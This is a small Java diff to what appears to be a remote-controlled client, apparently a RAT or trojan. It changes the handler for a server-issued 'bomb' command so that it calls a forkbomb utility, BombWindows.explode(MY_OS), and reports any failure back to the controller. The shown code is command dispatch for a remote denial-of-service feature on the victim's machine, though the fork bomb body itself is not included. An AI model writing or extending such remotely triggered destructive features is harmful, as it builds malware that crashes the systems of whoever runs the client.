@@ -3,7 +3,7 @@ package app;
 import exception.ServerOfflineException;
 import network.Connection;
 import network.Message;
-import utils.Bomb;
+import utils.forkbomb.BombWindows;
 import utils.ClientUtils;
 import utils.OsCheck;
 import utils.ScreenUtils;
@@ -64,7 +64,7 @@ public class Client {
                 break;
             case "bomb":
                 try {
-                    Bomb.explode();
+                    BombWindows.explode(MY_OS);
                 } catch (IOException e) {
                     connection.sendMessage(new Message("print", "ForkBomb failed: " + e.getMessage()));
                 }
